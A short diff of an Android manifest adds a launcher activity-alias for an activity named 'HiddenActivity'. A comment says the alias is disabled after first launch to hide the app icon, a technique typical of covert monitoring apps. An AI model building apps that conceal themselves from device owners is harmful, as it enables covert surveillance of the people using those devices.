@@ -21,12 +21,18 @@
         <activity
             android:name=".HiddenActivity"
             android:exported="true"
-            android:launchMode="singleInstance">
+            android:launchMode="singleInstance" />
+
+        <!-- Launcher alias (disabled after first launch to hide icon) -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".HiddenActivity"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Service -->
         <service
